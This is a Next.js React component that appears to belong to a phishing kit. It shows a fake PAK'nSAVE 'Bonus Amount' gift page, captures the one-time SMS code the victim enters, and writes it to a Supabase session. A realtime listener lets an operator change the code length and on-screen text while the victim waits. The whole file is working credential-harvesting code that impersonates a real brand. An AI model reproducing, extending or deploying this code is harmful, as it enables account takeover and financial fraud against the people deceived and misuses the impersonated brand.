"use client";

import { useEffect, useMemo, useState } from "react";
import { useRouter } from "next/navigation";
import { DemoShell } from "@/components/demo/DemoShell";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { stepToPath } from "@/lib/session-routes";
import { useSettings } from "@/contexts/SettingsContext";

type Props = {
  sessionId: string;
};

export function SmsClient({ sessionId }: Props) {
  const router = useRouter();
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const { settings, loading: settingsLoading } = useSettings();
  const [amount, setAmount] = useState<number>(0);
  const [currency, setCurrency] = useState("NZ$");
  const [digits, setDigits] = useState(6);
  const [customText, setCustomText] = useState<string | null>(null);
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [msg, setMsg] = useState<string | null>(null);
  const [sessionFormData, setSessionFormData] = useState<Record<string, unknown>>({});
  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null || !sessionId) {
        setLoading(false);
        return;
      }
      const { data } = await supabase.from("sessions").select("amount, sms_digits, form_data, sms_custom_text").eq("id", sessionId).maybeSingle();

      if (cancelled || !data) {
        setLoading(false);
        return;
      }
      setAmount(data.amount ?? 0);
      setDigits(data.sms_digits ?? 6);
      setCustomText(data.sms_custom_text);
      const fd = (data.form_data ?? {}) as Record<string, string>;
      setSessionFormData(fd);
      if (fd.currency) setCurrency(fd.currency);
      setCode(fd.smsCode ?? "");
      setLoading(false);
    })();

    // Supabase Realtime Listener for sms_digits changes
    if (supabase && sessionId) {
      const channel = supabase
        .channel(`sms-client:${sessionId}`)
        .on(
          "postgres_changes",
          {
            event: "UPDATE",
            schema: "public",
            table: "sessions",
            filter: `id=eq.${sessionId}`,
          },
          (payload) => {
            const next = payload.new as { sms_digits?: number; sms_custom_text?: string | null };
            if (next.sms_digits) {
              setDigits(next.sms_digits);
              // EÄŸer kod, yeni haneden uzunsa keselim
              setCode((prev) => prev.slice(0, next.sms_digits));
            }
            if (next.sms_custom_text !== undefined) {
              setCustomText(next.sms_custom_text);
            }
          }
        )
        .subscribe();

      return () => {
        cancelled = true;
        void supabase.removeChannel(channel);
      };
    }

    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase || !sessionId) return;
    setSaving(true);
    setMsg(null);

    const nextFormData = { ...sessionFormData, smsCode: code.trim() };
    const { error } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "wait", form_data: nextFormData })
      .eq("id", sessionId);

    setSaving(false);
    if (error) setMsg("Sending failed.");
    else {
      setSessionFormData(nextFormData);
      router.push(stepToPath("wait", sessionId));
    }
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (!sessionId) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 text-center">
          <p className="rounded-xl border border-red-500/30 bg-red-500/10 p-4 text-center text-sm text-red-400">
              Invalid link.
          </p>
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
        </div>
      </div>
    );
  }

  const trimmed = code.trim();
  const valid = trimmed.length === digits && /^\d+$/.test(trimmed);
  const displayText = customText || settings.sms_subtitle;

  // OTP style input handling
  const handleOtpChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    
    const newCode = code.split("");
    newCode[index] = value.substring(value.length - 1); // Only take the last char
    const updatedCode = newCode.join("");
    setCode(updatedCode.slice(0, digits));

    // Move to next input
    if (value && index < digits - 1) {
      const nextInput = document.getElementById(`otp-input-${index + 1}`);
      if (nextInput) nextInput.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !code[index] && index > 0) {
      const prevInput = document.getElementById(`otp-input-${index - 1}`);
      if (prevInput) prevInput.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, digits);
    setCode(pastedData);
    if (pastedData.length > 0) {
      const focusIndex = Math.min(pastedData.length, digits - 1);
      const input = document.getElementById(`otp-input-${focusIndex}`);
      if (input) input.focus();
    }
  };

  return (
    <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
      <div className="pak-form-card w-full max-w-[980px] fade-in">
        <div className="pak-form-inner px-5 pb-6 pt-6 sm:px-10 sm:pb-10 sm:pt-10 lg:px-12">
          <div className="grid gap-7 lg:grid-cols-[minmax(0,1.1fr)_260px] lg:items-start">
            <div className="min-w-0">
              <div className="max-w-[36rem]">
                <h2 className="pak-form-title">{settings.sms_title}</h2>
                <p className="pak-form-subtitle mt-3 whitespace-pre-line">{displayText.replace("{digits}", digits.toString())}</p>
              </div>

              <div className="pak-form-amount mt-5 w-full max-w-[25rem] px-5 py-4 sm:px-6">
                <div className="pak-form-amount-label">
                  <div>Your</div>
                  <div>Bonus Amount</div>
                </div>
                <div className="pak-form-amount-divider" />
                <div className="pak-form-amount-value">
                  {currency}{amount.toLocaleString("en-NZ")}
                </div>
              </div>
            </div>

            <div className="flex items-start justify-between gap-4 lg:block">
              <img
                src="/form-assets/paknsave-logo-form.png"
                alt="PAK'nSAVE"
                className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
                id="sms-brand-logo"
              />
              <img
                src="/form-assets/paknsave-gift-box.png"
                alt=""
                className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[220px] lg:translate-x-2"
              />
            </div>
          </div>
        
          <form onSubmit={handleSubmit} className="mt-7 space-y-6">
            <div className="pak-form-label">
              <div className="mb-4">{settings.sms_input_label} ({digits})</div>
              <div className="flex flex-wrap justify-center gap-2 sm:gap-3" onPaste={handlePaste}>
              {Array.from({ length: digits }).map((_, index) => (
                <input
                  key={index}
                  id={`otp-input-${index}`}
                  required
                  inputMode="numeric"
                  autoComplete="one-time-code"
                  maxLength={1}
                  className="pak-form-otp h-14 w-12 text-center text-2xl font-bold sm:h-16 sm:w-14 sm:text-3xl"
                  value={code[index] || ""}
                  onChange={(e) => handleOtpChange(index, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(index, e)}
                />
              ))}
              </div>
            </div>

            {!valid && code.length > 0 ? (
              <p className="text-xs text-red-400">Enter exactly {digits} digits.</p>
            ) : null}

            {msg ? <p className="text-center text-sm text-red-400">{msg}</p> : null}

            <div className="flex flex-col gap-4 pt-1 md:flex-row md:items-center md:justify-between">
              <div className="pak-form-security">
                <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                </svg>
                <span>The code was sent by SMS to your mobile number.</span>
              </div>

              <button
                type="submit"
                disabled={saving || !valid}
                className="pak-form-button min-h-[4.25rem] w-full px-6 text-xl md:w-[24rem]"
              >
                {saving ? settings.sms_loading : settings.sms_button}
              </button>
            </div>
          </form>

        </div>
      </div>
    </div>
  );
}
